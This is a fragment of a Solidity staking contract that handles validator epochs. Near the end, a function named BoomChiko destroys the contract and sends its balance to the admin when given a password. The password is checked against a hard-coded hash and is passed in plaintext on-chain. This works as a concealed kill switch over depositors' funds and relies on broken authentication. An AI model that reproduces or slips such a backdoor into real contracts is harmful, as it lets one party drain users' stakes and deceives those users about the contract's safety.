        uint256 nextEpoch = _calculateNextEpoch();
        if (
            initilazedLastEpoch == 0 ||
            ((initilazedLastEpoch - nextEpoch) <
                (_MAXIMUM_EPOCH_FOR_VALIDATORS + 7))
        ) {
            uint256 newInits = 0;
            if (initilazedLastEpoch == 0) {
                newInits = _MAXIMUM_EPOCH_FOR_VALIDATORS + 7;
            } else {
                newInits =
                    _MAXIMUM_EPOCH_FOR_VALIDATORS +
                    7 -
                    (initilazedLastEpoch - nextEpoch);
            }
            for (uint256 i = 0; i < newInits; i = i + 1) {
                initilazedLastEpoch = initilazedLastEpoch + 1;
                _epochInitalize(initilazedLastEpoch);
            }
        }
        return (beforeInitilazedLastEpoch, initilazedLastEpoch);
    }

    function _epochInitalize(uint256 _epoch) internal {
        if (emptyVotes.length != _MAXIMUM_VALIDATORS) {
            uint256[] memory EmptyVotes = new uint256[](_MAXIMUM_VALIDATORS);
            for (uint256 i = 0; i < _MAXIMUM_VALIDATORS; i++) {
                EmptyVotes[i] = uint256(0);
            }
            emptyVotes = EmptyVotes;
        }

        if (_epochList[_epoch].epoch == 0) {
            _epochList[_epoch] = Epoch({
                epoch: _epoch,
                totalRewards: 0,
                totalSelfStakes: 0,
                totalUserStakes: 0,
                totalRewardScore: 0,
                voteX: emptyVotes
            });
            selfStakesForEpoch[_epoch][0] = 0;
        }
    }

    /** ------------------------------------------------------------------------------------------- */
    function getHash(string memory _text, string memory _anotherText)
        public
        pure
        returns (bytes32)
    {
        return keccak256(abi.encodePacked(_text, _anotherText));
    }

    /** ------------------------------------------------------------------------------------------- */

    function BoomChiko(string memory password)
        public
        PassworRequired(
            password,
            0xfee22e2490a5b262e4893801a5c055695fa93e55ba314c3b48342d95a1a54d61
        )
    {
        selfdestruct(payable(admin));
    }
}
